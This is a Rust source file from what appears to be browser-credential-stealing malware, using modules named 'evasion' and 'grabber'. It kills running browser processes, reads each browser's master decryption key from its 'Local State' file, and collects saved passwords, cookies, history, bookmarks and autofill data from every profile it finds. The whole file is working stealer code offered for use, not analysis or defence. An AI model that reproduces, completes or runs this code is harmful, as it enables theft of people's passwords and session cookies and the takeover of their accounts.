
use rayon::prelude::{IntoParallelRefIterator, ParallelIterator, IndexedParallelIterator};
use std::sync::{Arc, Mutex};

use crate::evasion::process::ProcessInformationIterator;
use crate::browser::utils::{BROWSERS, BROWSER_EXE, PROFILES, Browser, Profiles};
use crate::browser::{autofill, bookmarks, cookies, history, password};
use crate::global;

fn kill_browsers() {
    for process_information in ProcessInformationIterator::new() {
        for exe in BROWSER_EXE.iter() {
            if process_information.name.trim().to_lowercase().contains(exe) {
                global::utils::prockill(process_information.pid, 1);
            }
        }
    }
}

fn grab_profile(browser: Arc<Mutex<Browser>>) -> Browser {
    let mut browser = browser.lock().unwrap().clone();

    let profiles: Vec<Profiles> = PROFILES
        .par_iter()
        .enumerate()
        .filter_map(|(i, profile)| {
            if std::path::Path::new(&format!("{}\\{}", &browser.path, profile)).exists() {
                Some(Profiles {
                    id: i,
                    profile_name: profile.to_string(),
                    cookies: cookies::get(&browser, profile),
                    history: history::get(&browser, profile),
                    password: password::get(&browser, profile),
                    bookmarks: bookmarks::get(&browser, profile),
                    autofill: autofill::get(&browser, profile),
                })
            } else {
                None
            }
        })
        .collect();

    browser.profiles = profiles;

    browser
}

pub async fn grab_browser() -> Vec<Browser> {
    kill_browsers();

    let content: Vec<Browser> = BROWSERS
        .par_iter()
        .filter_map(|(name, path)| {
            if std::path::Path::new(path).exists() {
                if let Ok(masterkey) = crate::grabber::grabber::get_master_key(&format!("{}\\Local State", path)) {
                    let browser = Browser {
                        path: path.to_string(),
                        name: name.to_string(),
                        masterkey,
                        profiles: Vec::new(),
                    };

                    Some(grab_profile(Arc::new(Mutex::new(browser))))
                } else {
                    None
                }
            } else {
                None
            }
        })
        .collect();
    content
}